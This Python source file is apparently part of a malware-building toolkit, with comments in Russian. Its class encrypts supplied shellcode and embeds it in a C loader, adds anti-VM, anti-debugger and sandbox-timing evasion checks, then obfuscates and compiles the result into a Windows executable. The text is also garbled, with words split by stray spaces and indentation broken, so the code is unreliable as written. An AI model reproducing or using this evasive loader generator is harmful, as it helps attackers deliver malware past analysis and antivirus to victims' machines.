import os



import random



import tempfile



import subprocess



from typ in gimport List,Dict,Any,Union,Tuple,Optional,B in aryIO







from core.interfacesimport Bas eGenerator



from utils.cryptoimport aes_encrypt,xor_encrypt,generate_key,generate_encryption_stub







clas sShellcodeGenerator(Bas eGenerator):











def__init__(self):



        self.template_path=None



self.template_file="shellcode_runner.c"







defgenerate(self,



payload:str,



template_path:str,



obfuscators:List=None,



evas ion_techniques:List=None,



iterations:int=1)->bytes:







self.template_path=template_path











template_file_path=os.path.join(template_path,self.template_file)



if notos.path.exists(template_file_path):



            template_file_path=os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),



"templates",self.template_file)







if notos.path.exists(template_file_path):



            raiseFileNotFoundError(f"Шаблон не найден: {template_file_path}")







withopen(template_file_path,'r')as f:



            template=f.read()











if os.path.exists(payload):



            withopen(payload,'rb')as f:



                shellcode_data=f.read()



else:







            try:







                shellcode_data=bytes.from hex(payload.replace('\\x','').replace('0x','').replace(' ',''))



except:







                shellcode_data=payload.encode('latin1')











key=generate_key(32)



encrypted_payload,key,iv=aes_encrypt(shellcode_data,key)











formatted_payload=self._format_bytes_for_c(encrypted_payload)



formatted_key=self._format_bytes_for_c(key)



formatted_iv=self._format_bytes_for_c(iv)











decrypt_function=generate_encryption_stub("c","aes")











anti_vm_check=self._generate_anti_vm_check()



anti_debug_check=self._generate_anti_debug_check()



time_delay_check=self._generate_time_delay_check()











template=template.replace("{{PAYLOAD}}",formatted_payload)



template=template.replace("{{PAYLOAD_SIZE}}",str(len(encrypted_payload)))



template=template.replace("{{KEY}}",formatted_key)



template=template.replace("{{KEY_SIZE}}",str(len(key)))



template=template.replace("{{IV}}",formatted_iv)



template=template.replace("{{DECRYPT_FUNC}}",decrypt_function)



template=template.replace("{{ANTI_VM_CHECK}}",anti_vm_check)



template=template.replace("{{ANTI_DEBUG_CHECK}}",anti_debug_check)



template=template.replace("{{TIME_DELAY_CHECK}}",time_delay_check)











if obfuscators:



            obfuscated_code=template



for_inrange(iterations):



                forobfuscator in obfuscators:



                    obfuscated_code=obfuscator(obfuscated_code)



template=obfuscated_code











if evas ion_techniques:



            evas ion_code=template



fortechnique in evas ion_techniques:



                evas ion_code=technique(evas ion_code)



template=evas ion_code











return self._compile_code(template)







def_format_bytes_for_c(self,data:bytes)->str:







return", ".join([f"0x{b:02x}"forb in data])







def_generate_anti_vm_check(self)->str:







return"""
// Проверяем наличие признаков виртуализации
BOOL check_vm() {
    SYSTEM_INFO sysInfo;
    DWORD return Len = 0;
    LPVOID drivers[1024];
    int i;
    char deviceName[1024];
    BOOL vm_detected = FALSE;
    
    // Проверка имени компьютера
    char hostname[256];
    DWORD hostname_len = sizeof(hostname);
    if (GetComputerNameA(hostname, &hostname_len)) {
        const char* vm_hostnames[] = {
            "Virtual", "VirtualBox", "VMware", "vbox", "sandbox", "Sandbox", "SANDBOX"
        };
        
        for (i = 0; i < sizeof(vm_hostnames) / sizeof(vm_hostnames[0]); i++) {
            if (strstr(hostname, vm_hostnames[i])) {
                return TRUE;
            }
        }
    }
    
    // Проверка драйверов устройств
    GetSystemInfo(&sysInfo);
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &return Len)) {
        for (i = 0; i < return Len / sizeof(drivers[0]); i++) {
            if (GetDeviceDriverBas eNameA(drivers[i], deviceName, sizeof(deviceName))) {
                if (strstr(deviceName, "vmware") || 
                    strstr(deviceName, "vbox") || 
                    strstr(deviceName, "virtual")) {
                    return TRUE;
                }
            }
        }
    }
    
    // Проверка размера RAM (часто в ВМ меньше 4 ГБ)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        if (memInfo.ullTotalPhys < 4ULL * 1024ULL * 1024ULL * 1024ULL) {
            return TRUE;
        }
    }
    
    // Добавим случайность в решение, чтобы запутать статический анализ
    if (rand() % 100 == 0) {
        return FALSE;  // Это никогда не произойдет из-за предыдущих проверок
    }
    
    return FALSE;
}
"""







def_generate_anti_debug_check(self)->str:







return"""
// Проверяем наличие отладчика
BOOL check_debugger() {
    // 1. Прямая проверка через W in dows API
    if (IsDebuggerPresent()) {
        return TRUE;
    }
    
    // 2. Проверка через NtQueryInformationProcess
    BOOL debugged = FALSE;
    typedef NTSTATUS (WINAPI* pNtQueryInformationProcess)(
        HANDLE ProcessHandle,
        DWORD ProcessInformationClas s,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );
    
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        pNtQueryInformationProcess NtQueryInformationProcess = 
            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            DWORD processDebugPort = 0;
            NTSTATUS status = NtQueryInformationProcess(
                GetCurrentProcess(),
                7, // ProcessDebugPort
                &processDebugPort,
                sizeof(processDebugPort),
                NULL
            );
            
            if (NT_SUCCESS(status) && processDebugPort != 0) {
                return TRUE;
            }
        }
    }
    
    // 3. Обнаружение отладочных инструментов в списке процессов
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (strstr(pe32.szExeFile, "ollydbg.exe") ||
                    strstr(pe32.szExeFile, "x64dbg.exe") ||
                    strstr(pe32.szExeFile, "ida.exe") ||
                    strstr(pe32.szExeFile, "ida64.exe") ||
                    strstr(pe32.szExeFile, "w in dbg.exe") ||
                    strstr(pe32.szExeFile, "processhacker.exe")) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // 4. Замеряем время выполнения (в отладчике будет дольше)
    DWORD startTime = GetTickCount();
    for (int i = 0; i < 10000000; i++) {
        // Пустой цикл для замера времени
    }
    DWORD endTime = GetTickCount();
    
    if (endTime - startTime > 1000) {  // Если выполнялось более 1 секунды
        return TRUE;
    }
    
    return FALSE;
}
"""







def_generate_time_delay_check(self)->str:







return"""
// Проверяем наличие ускорения времени (песочница)
BOOL check_time_delay() {
    DWORD startTime, endTime, elapsedTime;
    BOOL timeManipulated = FALSE;
    
    // Проверка 1: простая задержка
    startTime = GetTickCount();
    Sleep(1000);  // Задержка в 1 секунду
    endTime = GetTickCount();
    elapsedTime = endTime - startTime;
    
    // Если прошло слишком мало времени или слишком много
    if (elapsedTime < 900 || elapsedTime > 1200) {
        timeManipulated = TRUE;
    }
    
    // Проверка 2: система работает достаточно долго?
    DWORD uptime = GetTickCount() / 1000;  // Время в секундах
    if (uptime < 300) {  // Меньше 5 минут
        timeManipulated = TRUE;
    }
    
    // Проверка 3: расхождение времени ожидания Sleep и GetTickCount
    startTime = GetTickCount();
    for (int i = 0; i < 3; i++) {
        Sleep(100);
    }
    endTime = GetTickCount();
    
    if (endTime - startTime < 290 || endTime - startTime > 330) {
        timeManipulated = TRUE;
    }
    
    return timeManipulated;
}
"""







def_compile_code(self,code:str)->bytes:











withtempfile.NamedTemporaryFile(suffix='.c',delete=False)as src_file:



            src_path=src_file.name



src_file.write(code.encode('utf-8'))







output_path=src_path.replace('.c','.exe')







try:







            cmd=f"gcc {src_path} -o {output_path} -lwsock32 -lws2_32 -lw in inet -lcrypt32 -mw in dows"











if'PROCESSOR_ARCHITECTURE'inos.environandos.environ['PROCESSOR_ARCHITECTURE']=='AMD64':



                cmd+=" -m64"



else:



                cmd+=" -m32"







subprocess.run(cmd,shell=True,check=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)











withopen(output_path,'rb')as f:



                exe_data=f.read()







return exe_data







except subprocess.CalledProcessErroras e:



            pr in t(f"Ошибка компиляции: {e}")



pr in t(f"STDOUT: {e.stdout.decode('utf-8', errors='ignore')}")



pr in t(f"STDERR: {e.stderr.decode('utf-8', errors='ignore')}")



raise



f in ally:







            if os.path.exists(src_path):



                os.unl in k(src_path)



if os.path.exists(output_path):



                os.unl in k(output_path)